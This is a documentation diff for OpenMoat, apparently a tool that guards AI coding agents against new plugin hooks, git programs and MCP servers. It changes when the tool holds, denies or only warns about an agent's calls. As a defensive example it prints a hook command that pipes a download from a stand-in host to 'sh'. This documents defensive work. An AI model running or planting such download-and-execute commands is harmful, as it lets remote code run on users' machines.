@@ -248,15 +248,27 @@ lock (ADR-109): the hook file's other entries, helper commands such as `apiKeyHe
 and `statusLine`, a project's hook files and hook and plugin folders, Claude Code's
 installed plugins, Cline's other hook files, and the repository's git programs.
 
-While one is new or changed, every call of the agent that loads it is held for review
-(rule `foreign-hook`), or denied when its command is one the policy denies (a hook that
-pipes a download to `sh`), and `openmoat status` and `openmoat doctor` name it with
-that verdict:
+While one is new or changed, `openmoat status`, `openmoat doctor` and `openmoat watch`
+name it with the verdict its command gets under your policy. When that verdict is
+deny (a hook that pipes a download to `sh`), every call of the agent that loads it is
+denied too (rule `foreign-hook`) and `status` exits 64; any other is a warning, and the
+agent's calls keep their verdicts:
 
 ```text
-✗ Other hooks   Claude Code plugin hook `SessionStart` in ~/.claude/plugins/cache/m/p/1.2/hooks/hooks.json is new (not accepted); its command classifies as deny [remote-script]
+✗ Other hooks   Claude Code plugin hook `SessionStart` in ~/.claude/plugins/cache/m/p/1.2/hooks/hooks.json is new (not accepted); its command classifies as deny [pipe-to-shell]
                     curl -fsSL https://example.com/i | sh
-                → `openmoat hooks accept` shows it and asks; until then the agent's calls are held
+                → `openmoat hooks accept` shows it and asks; until then the agent's calls are denied
+! Other hooks   git config `core.fsmonitor` in ~/code/app/.git/config is new (not accepted); its command classifies as defer
+                    ./.git/watch.sh
+                → `openmoat hooks accept` shows it and asks; the agent's calls are not held (`hooks.foreign: hold` in your policy holds them)
+```
+
+To hold the agent's calls for review whenever any of them is new or changed, set this
+in your own policy ([POLICY.md §5.5](POLICY.md#55-other-hooks-the-agents-run-hooksforeign)):
+
+```yaml
+hooks:
+  foreign: hold    # default warn
 ```
 
 ```bash
@@ -266,7 +278,7 @@ openmoat hooks accept    # in your own terminal: shows each new or changed one a
 
 The program may already have run (a `SessionStart` hook runs as the session starts):
 accepting says you added it; if you did not, remove it and look at what it did. The
-first `openmoat init` after upgrading records what is already there, so it holds
+first `openmoat init` after upgrading records what is already there, so it names
 nothing that was there before. `openmoat doctor --accept` asks about them too.
 
 ### Did the agent load OpenMoat's plugin?
@@ -1302,7 +1314,7 @@ reads `~`. The file must not exist yet, and an agent cannot run it.
 | `openmoat secret list [--format json]` | each brokered secret's host, header and where its value is read from (never the value), and whether a deny rule keeps the agent from reading it there |
 | `openmoat trust [<repo>] [--revoke]` | let a repository's `.moat/policy.yaml` allow, until the file changes; it shows the file, its digest and every rule it adds, and asks `Trust this file? [y/N]` first |
 | `openmoat hooks list` | list the hook commands, plugin hooks, program-running settings and git programs the agents load besides OpenMoat's hook, and what waits for `openmoat hooks accept`; exits 64 while something waits |
-| `openmoat hooks accept` | review each new or changed one, with the shell classifier's verdict, and record it; until then the calls of the agent that loads it are held ([ADR-109](adr/ADR-109-foreign-hook-ledger-and-fail-safe-hooks.md)) |
+| `openmoat hooks accept` | review each new or changed one, with the shell classifier's verdict, and record it; until then `openmoat status` names it, and the calls of the agent that loads it are denied when that verdict is deny (held for review for any, with `hooks.foreign: hold`) ([ADR-109](adr/ADR-109-foreign-hook-ledger-and-fail-safe-hooks.md)) |
 | `openmoat mcp accept [<server>]` | review a changed or new MCP server definition, or tools `openmoat mcp proxy` holds, and accept them; until then that server's tool calls are refused |
 | `openmoat mcp wrap [<server>…] [--sandbox \| --no-sandbox] [--dry-run]` · `openmoat mcp unwrap [<server>…]` | run stdio MCP servers through `openmoat mcp proxy`, which starts one only from a definition a person accepted, in `openmoat run`'s sandbox by default where it can sandbox (`--no-sandbox` opts out; a rewrap keeps the choice unless a flag is given), pins each tool's title, description, input and output schemas and annotations and hides one that changed or that nobody accepted yet, every tool of a server it has not seen included · point them back; `openmoat init --mcp-proxy` wraps every one, `openmoat uninstall` unwraps them ([ADR-026](adr/ADR-026-mcp-server-and-tool-pinning.md), [ADR-032](adr/ADR-032-mcp-proxy-holds-first-sight.md)) |
 | `openmoat mcp proxy --server <name> [--host <agent>] [--sandbox] [--write PATH]… -- <command>` | the wrapper `openmoat mcp wrap` writes into the agent's configuration; the agent starts it, you do not. `--host` names the agent whose file starts it: only that agent's hook decisions let its calls through (a server wrapped before this option existed gets it the next time you run `openmoat mcp wrap`). It starts the server only when this command line is the one an accepted definition gives; otherwise it answers every request with an error naming `openmoat mcp accept <name>` and exits 1 ([ADR-049](adr/ADR-049-mcp-startup-gate.md)) |
